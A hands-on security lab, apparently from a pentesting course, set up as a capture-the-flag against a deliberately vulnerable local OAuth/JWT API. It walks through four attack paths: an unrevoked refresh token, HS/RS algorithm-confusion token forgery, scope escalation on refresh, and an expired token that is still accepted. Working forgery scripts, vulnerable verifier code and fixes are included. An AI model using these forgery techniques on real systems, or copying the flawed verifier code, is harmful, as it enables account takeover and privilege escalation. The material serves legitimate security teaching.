# Lab 04 — CTF: The Token That Outlived Its Owner

**Difficulty:** Advanced
**Time:** 3–5 hours
**Prerequisites:** [Lab 01](lab-01-anatomy-of-a-token.md),
[Lab 02](lab-02-the-jwt-attack-gauntlet.md), [Lab 03](lab-03-tokens-at-rest.md),
[Chapter 46 §3.9–§3.12 and §5](../README.md#5-security-perspective)

---

## The challenge

Fourteen months ago, an employee left. Their laptop and phone were returned, their
directory account was disabled, and the offboarding checklist was signed off.

The handset was wiped and reissued. During a routine forensic exercise, one file was
recovered from an old device image: a SharedPreferences XML from an internal application
called **Ledger**.

You are handed that file and a hostname. Nothing else.

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="access_token">eyJhbGciOiJSUzI1NiIsImtpZCI6InJzYS0yMDI2LTA4IiwidHlwIjoiYXQrand0In0...</string>
    <string name="refresh_token">rt_tCcIuYMoFTmsjqqgB-k_u7ADwR2kqpub</string>
    <long name="expires_at" value="1751981309000" />
    <string name="account">j.mercer</string>
</map>
```

**Read the audit log.** The flag is in it.

The access token in that file expired **400 days ago**. The account it belongs to was
disabled fourteen months ago. Everything about this artefact says it is dead.

There are **four independent paths** to the flag, and each one fails at a different layer.
Find one. Then find a second. Then find all four, because the point of this CTF is not the
flag — it is being able to say, for each path, *which control failed and who owns it*.

---

## Rules

- No brute-forcing anything. No wordlists.
- No reading `ctf-state.json` or any file on the server's filesystem.
- No modifying the server's code or configuration to make an attack work.
- The RSA private key in `--workdir/private/` is off limits. Everything you need is
  either in the artefact or published at a public endpoint.
- For every path you use, you must be able to name: **which control failed**, **at which
  layer** (the token endpoint, the resource server's verifier, or an organisational
  process), and **who would have to fix it**.

---

## Building the challenge

Build it yourself. Implementing the flaws is most of the education, and you cannot report
on a mechanism you have not constructed.

### Step 1 — Key material

```bash
# host
CH46="path/to/Android-Pentesting-Notes/46-Tokens"
WORK="$HOME/ch46-ctf"                                  # OUTSIDE any repository

python3 -B "$CH46/labs/gauntlet/issuer.py" --workdir "$WORK" --init
```

The same throwaway 2048-bit keypair the gauntlet used. It exists for the life of this lab.

### Step 2 — Seed and run Ledger

[`ctf/ledger_api.py`](ctf/ledger_api.py) is the backend. It plays two roles a real
deployment would separate — the token endpoint and the resource server — because separating
them here doubles the setup for no teaching benefit.

```bash
# host
pip install flask cryptography

python3 -B "$CH46/labs/ctf/ledger_api.py" --workdir "$WORK" --seed
python3 -B "$CH46/labs/ctf/ledger_api.py" --workdir "$WORK"
```

```
[+] state    ~/ch46-ctf/ctf-state.json
[+] artefact ~/ch46-ctf/recovered-auth.xml
[+] Give the participant ONLY recovered-auth.xml and the hostname.
[!] ctf-state.json contains the flag. Instructors only.

[*] Ledger on http://127.0.0.1:9200  (loopback only)
[*] Four flaws. Four paths. None of them requires breaking any cryptography.
```

It binds to loopback and refuses anything else. A deliberately vulnerable token endpoint
reachable from a network is a hazard, not a teaching aid.

### Step 3 — Your starting position

```bash
# host — this, and the hostname, is everything you have
cat "$WORK/recovered-auth.xml"
```

Extract the two values:

```bash
# host
AT=$(python3 -B -c "
import re; print(re.search(r'access_token\">([^<]+)',
    open('$WORK/recovered-auth.xml').read()).group(1))")
RT=$(python3 -B -c "
import re; print(re.search(r'refresh_token\">([^<]+)',
    open('$WORK/recovered-auth.xml').read()).group(1))")
echo "AT is ${#AT} chars; RT is ${#RT} chars"
```

---

## Your first attempt, which will look hopeless

```bash
# host
python3 -B "$CH46/scripts/jwt-analyse.py" --token "$AT" \
    --expect-iss https://issuer.lab.local \
    --expect-aud com.pentest.ch46.ledger
```

**Q1.** The analyser tells you the token expired a long time ago. Exactly how long? What is
its `sub`, its `scope`, and its `typ`? What does `typ: at+jwt` tell you about which spec
this deployment is following, and what does that spec require of the resource server?

**Q2.** The refresh token does not start `eyJ` and has no dots. What kind of token is it?
List the three things you now *cannot* do with it, and the two things you can.

**Q3.** Both artefacts belong to a person who was offboarded fourteen months ago. Write
down, before you touch the server, why you might reasonably expect **both** to be dead. Keep
that sentence — the debrief asks you to compare it with what you found.

---

## Reconnaissance

```bash
# host
curl -s http://127.0.0.1:9200/.well-known/openid-configuration | jq .
curl -s http://127.0.0.1:9200/jwks | jq .
```

**Q4.** The discovery document advertises a `revocation_endpoint`. What does its presence
tell you? What does it *not* tell you?

**Q5.** `/jwks` publishes the issuer's RSA public key. Is publishing it a flaw? Answer
carefully — the answer is no, and the reason matters for one of the four paths.

**Q6.** `scopes_supported` lists `admin`. The recovered token's scope is `notes.read`. Where
in this system does a scope get chosen, and what would have to be true for you to choose a
different one?

Establish a baseline before anything else:

```bash
# host — does the artefact work AT ALL?
curl -s -H "Authorization: Bearer $AT" http://127.0.0.1:9200/api/whoami | jq .
```

**Q7.** What happened? Write down your reaction before reading on, because this is the
moment the CTF turns.

---

## Investigation

Work these before opening the solutions.

### The verifier

```bash
# host — what does it reject?
NONE=$(python3 -B -c "
import base64,json,time
def s(o): return base64.urlsafe_b64encode(
    json.dumps(o,separators=(',',':'),sort_keys=True).encode()).rstrip(b'=').decode()
n=int(time.time())
print(s({'alg':'none','typ':'JWT'}) + '.' + s({'iss':'https://issuer.lab.local',
  'sub':'j.mercer','aud':'com.pentest.ch46.ledger','iat':n,'exp':n+900,
  'scope':'admin'}) + '.')")
curl -s -H "Authorization: Bearer $NONE" http://127.0.0.1:9200/api/admin/audit | jq .
```

**Q8.** `alg=none` is rejected. What does that tell you about the people who wrote this
verifier? Does it make you more or less confident about the *rest* of their algorithm
handling? Justify your answer, then test it.

### The token endpoint

```bash
# host
curl -s -X POST http://127.0.0.1:9200/token \
     -d grant_type=refresh_token -d refresh_token="$RT" | jq .
```

**Q9.** What came back? Is there a new `refresh_token` in the response? What does its
presence or absence tell you, and how does that change the severity of everything else you
find?

### The scope

```bash
# host — the original grant was notes.read. Ask for more.
curl -s -X POST http://127.0.0.1:9200/token \
     -d grant_type=refresh_token -d refresh_token="$RT" \
     -d scope="notes.read admin" | jq '.scope'
```

**Q10.** RFC 6749 §6 says the scope requested on a refresh must not exceed the scope of the
original grant. What did this server do? Which single word in the implementation
distinguishes correct from incorrect here?

### The endpoints

```bash
# host
for ep in /api/whoami /api/notes /api/admin/audit; do
  printf '%-20s ' "$ep"
  curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $AT" \
       "http://127.0.0.1:9200$ep"
done
```

**Q11.** One endpoint returns 403 while the others return 200. What does a 403 mean here,
and why is it a *more encouraging* result than a 401?

---

## Solutions

Do not read these until you have made a genuine attempt at all four.

<details>
<summary>Path A — the refresh token was never revoked</summary>

**The control that failed:** token revocation at offboarding.
**The layer:** organisational process, plus the authorization server.
**Who fixes it:** whoever owns the joiner-mover-leaver process, not the developers.

The `/revoke` endpoint exists and works. `ledger_api.py`'s state has a `revoked` field on
every refresh token, and `/token` checks it:

```python
if record.get("revoked"):
    return jsonify({"error": "invalid_grant", "error_description": "revoked"}), 400
```

Nothing ever writes it. The audit log says why:

```
2025-06-02  j.mercer offboarded; laptop and phone returned
2025-06-02  AD account disabled
2025-06-02  TODO: revoke API tokens -- ticket LEDGER-4471
```

The directory account was disabled. The API tokens were a ticket nobody closed.

```bash
# host
NEW=$(curl -s -X POST http://127.0.0.1:9200/token \
      -d grant_type=refresh_token -d refresh_token="$RT" | jq -r .access_token)
curl -s -H "Authorization: Bearer $NEW" http://127.0.0.1:9200/api/notes | jq .
```

```json
{
  "notes": ["handover doc: see audit log for the recovery phrase"],
  "scope": "notes.read",
  "sub": "j.mercer"
}
```

A live access token for a person who left fourteen months ago, minted on demand, from an
artefact recovered off a wiped handset.

This is the most realistic path in the CTF and the one that produces the most argument in a
debrief, because **nothing here is a bug**. Every line of code is correct. The control is
present, it is implemented properly, and it is never triggered. That shape — a correct
control that nothing invokes — is far more common than a missing one and much harder to
find in a code review, because reading the code shows you the check.

Note also what is missing from the refresh response: there is no new `refresh_token`.
Rotation is off. With rotation and reuse detection (§3.9) this artefact would have died the
first time the legitimate app refreshed after it was copied — the reuse would have revoked
the family. Without rotation, the token in that XML file is as good on the day it was
recovered as it was on the day it was issued.
</details>

<details>
<summary>Path B — HS/RS algorithm confusion</summary>

**The control that failed:** the resource server's algorithm handling.
**The layer:** the verifier.
**Who fixes it:** the API team, in one frozenset and two dictionaries.

`alg: none` is rejected — somebody read about the famous attack and patched exactly that
one string. The structural problem is untouched:

```python
# labs/ctf/ledger_api.py -- FLAW B
alg = str(header.get("alg", ""))
if alg.lower() == "none":
    return None, "alg=none rejected"          # they fixed THIS one

key_material = public_pem()                   # ONE blob, whatever the algorithm

if alg.upper().startswith("HS"):
    expected = b64url(hmac.new(key_material, si, hashlib.sha256).digest())
    ...
elif alg.upper().startswith("RS"):
    pub = serialization.load_pem_public_key(key_material)
    ...
```

The RSA public key is published at `/jwks`. That is not a flaw — it is how asymmetric
signing works. It becomes a flaw the moment a verifier picks its primitive from a field the
attacker writes.

Reconstruct the PEM from the published JWKS — the attacker does not need the file:

```bash
# host
python3 -B - <<'PY' > pub.pem
import base64, json, urllib.request
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

jwks = json.load(urllib.request.urlopen("http://127.0.0.1:9200/jwks"))
k = jwks["keys"][0]
def num(s): return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")
pub = rsa.RSAPublicNumbers(num(k["e"]), num(k["n"])).public_key()
print(pub.public_bytes(serialization.Encoding.PEM,
                       serialization.PublicFormat.SubjectPublicKeyInfo).decode(), end="")
PY
diff <(cat pub.pem) "$WORK/keys/rsa-2026-08" && echo "byte-identical to the issuer's file"
```

That `diff` is the moment worth pausing on: the bytes you reconstructed from a public
endpoint are **exactly** the bytes the verifier loads from disk. Now use them as an HMAC
secret:

```bash
# host
FORGED=$(python3 -B - <<'PY'
import base64, hashlib, hmac, json, time
pub = open("pub.pem", "rb").read()
def seg(o): return base64.urlsafe_b64encode(
    json.dumps(o, separators=(",",":"), sort_keys=True).encode()).rstrip(b"=").decode()
now = int(time.time())
claims = {"iss": "https://issuer.lab.local", "sub": "j.mercer",
          "aud": "com.pentest.ch46.ledger", "iat": now, "exp": now + 900,
          "scope": "notes.read notes.write admin"}
si = seg({"alg": "HS256", "typ": "at+jwt", "kid": "rsa-2026-08"}) + "." + seg(claims)
sig = base64.urlsafe_b64encode(
    hmac.new(pub, si.encode("ascii"), hashlib.sha256).digest()).rstrip(b"=").decode()
print(si + "." + sig)
PY
)
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9200/api/admin/audit | jq .
```

```json
{
  "audit": [
    {"event": "j.mercer offboarded; laptop and phone returned", "ts": "2025-06-02"},
    {"event": "AD account disabled", "ts": "2025-06-02"},
    {"event": "TODO: revoke API tokens -- ticket LEDGER-4471", "ts": "2025-06-02"},
    {"event": "recovery phrase: LAB{...}", "ts": "2026-08-12"}
  ]
}
```

No key was stolen. No cryptography was broken. A value that is **correctly public** was used
for a second purpose because the code let the token choose which purpose.

This path needs no artefact at all. You could have done it with nothing but the hostname.
</details>

<details>
<summary>Path C — scope escalation at the refresh endpoint</summary>

**The control that failed:** intersecting requested scope with granted scope.
**The layer:** the token endpoint.
**Who fixes it:** the authorization server team, in one line.

```python
# labs/ctf/ledger_api.py -- FLAW C
scope = request.form.get("scope") or record["scope"]
```

It **substitutes** where it should **intersect**. RFC 6749 §6 is explicit that the scope
requested on a refresh must not exceed the original grant.

```bash
# host
ADM=$(curl -s -X POST http://127.0.0.1:9200/token \
      -d grant_type=refresh_token -d refresh_token="$RT" \
      -d scope="notes.read admin" | jq -r .access_token)
curl -s -H "Authorization: Bearer $ADM" http://127.0.0.1:9200/api/admin/audit | jq .
```

The flag comes back.

What makes this one instructive is that the **resource server is not at fault**.
`/api/admin/audit` checks the scope correctly and returns 403 without it. The endpoint that
enforces scope is doing its job perfectly; the endpoint that hands out scope is giving it
away for free. A reviewer auditing the resource server finds nothing.

The fix, as code:

```python
requested = set((request.form.get("scope") or "").split())
granted   = set(record["scope"].split())
if requested - granted:
    return jsonify({"error": "invalid_scope"}), 400        # or intersect silently
scope = " ".join(sorted(requested & granted)) if requested else record["scope"]
```
</details>

<details>
<summary>Path D — `exp` is never checked</summary>

**The control that failed:** expiry enforcement.
**The layer:** the verifier.
**Who fixes it:** the API team, in three lines.

The simplest path, and the one everybody dismisses because the token "obviously expired".

```bash
# host — the artefact, unmodified, straight from the file
curl -s -H "Authorization: Bearer $AT" http://127.0.0.1:9200/api/notes | jq .
```

```json
{
  "notes": ["handover doc: see audit log for the recovery phrase"],
  "scope": "notes.read",
  "sub": "j.mercer"
}
```

A token that expired **400 days ago**, from a decommissioned handset, belonging to a
disabled account, returns 200.

The verifier's code for this:

```python
# labs/ctf/ledger_api.py -- FLAW D
#
# There is no code here. That is the vulnerability.
```

It verifies the signature. It checks `iss`. It checks `aud`. It rejects `alg: none`. All
four of those make it *look* thorough, and it never reads `exp`.

The fix:

```python
exp = claims.get("exp")
if not isinstance(exp, (int, float)):
    return None, "no numeric exp -- refused"
if time.time() > exp + 60:
    return None, "expired"
```

The reason this path is worth the most in a debrief: it required **no forgery, no tooling,
no cryptography and no reconnaissance**. It was one `curl` with the file you were handed. If
you spent two hours on Path B before trying it, that is the lesson, and it is the same
lesson [45-OAuth's CTF](../../45-OAuth/labs/lab-04-ctf-the-borrowed-identity.md) teaches
from the other direction — participants decompile for two hours because decompiling feels
like progress.
</details>

---

## Debrief

Answer in writing. These are the actual point of the lab.

1. In Q3 you wrote down why you expected both artefacts to be dead. Compare that with what
   you found. Which of your assumptions was wrong, and what was the *reasoning error* — not
   the technical fact, the reasoning error?

2. Rank the four paths by (a) how quickly you found them, (b) how severe each is, and (c)
   how likely an automated scanner is to catch each. Where do the three rankings disagree?

3. Path A involves **no bug**. Every line of code is correct. Explain to an engineering
   manager why it is nevertheless the finding you would lead the report with, and who you
   would address the remediation to.

4. Path B works with **nothing but the hostname** — no artefact, no interception, no
   device. What does that imply about a threat model that focuses on device-side attackers?

5. Path D required one `curl` and no tooling at all. Write the sentence you would say to a
   team that spent its security budget on client-side obfuscation.

6. The verifier rejects `alg: none` and is still catastrophically broken. Write the code
   review comment that would have caught the *structural* problem, in a form the author
   would accept rather than resent.

7. For each of the four paths, name the layer and the owner. Then say which single fix
   would have blocked the most paths, and which single fix would have blocked the most
   *severe* path. Are they the same fix?

8. Rotation with reuse detection (§3.9) was not implemented. Trace exactly what would have
   happened to Path A if it had been. Would the artefact have been dead on arrival, or dead
   the first time the real app refreshed? Does the difference matter?

9. Write all four findings, with severity, impact, evidence and remediation as code or
   configuration. Then write the **single paragraph** you would put at the top of the
   report. What is the theme that connects all four?

10. §5.10 says a captured token from your own test account is not a finding. Every token you
    used here was either recovered from an artefact you were given or minted by you. What,
    precisely, made these findings? Answer in terms of properties of the system.

11. You are asked to write automated regression tests so none of these four can return.
    Write the assertion for each. Which one is hardest to automate, and why does that
    difficulty say something important about where security actually lives?

---

## Success criteria

- [ ] You recovered the flag
- [ ] You recovered it by **all four** paths
- [ ] For each path you can name the control, the layer and the owner
- [ ] You reconstructed the RSA public key from the published JWKS and confirmed it was
      byte-identical to the file the verifier loads
- [ ] You can explain why publishing that key is **not** a flaw
- [ ] You can explain why Path A involves no bug at all
- [ ] You noticed that the refresh response carries no new refresh token, and can say what
      that changes
- [ ] You explained why `alg: none` being rejected made the verifier look *more*
      trustworthy than it was
- [ ] You wrote all four findings and the connecting paragraph
- [ ] Every token you handled was minted by you or supplied as part of this lab, and the
      workdir is deleted

---

## Note for instructors

The pedagogical goal is not the flag. It is the moment a participant, having spent ninety
minutes reconstructing an RSA public key from a JWKS document to mount an elegant algorithm
confusion attack, tries the token they were handed at the start and gets a 200.

Run it in this order with a group:

1. **Hand out only `recovered-auth.xml` and the hostname.** Say nothing about the number of
   paths.
2. **Let them analyse the artefact.** Everyone will observe that the access token expired
   400 days ago and set it aside. Do not correct them.
3. **After 45 minutes, ask one question:** *"has anyone actually sent it?"* Most groups have
   not. The room goes quiet.
4. **Then reveal that there are four paths** and let them work.
5. **Release the source last**, and only after everyone has at least two paths.

The ordering matters because Path D is the cheapest and the most humbling, and it lands
hardest when discovered after the expensive one. Participants who find Path D first should
be required to also produce Path B, which needs real understanding; participants who find
Path B first should be required to produce Path A, which needs none and is the most
realistic.

**The argument to provoke in the debrief** is question 3. Path A has no bug. Half the room
will insist it is therefore not a security finding and belongs to IT operations. The other
half will point out that it is the one that actually happened, in the real world, to a real
person's account, and that a report which omits it because the code is clean has failed the
client. Both positions are defensible and the disagreement is the education. Let it run.

---

## Cleanup

```bash
# host
rm -rf "$WORK"          # the private key, the state, the flag, and every token
```

Everything in this lab was throwaway. Delete it.
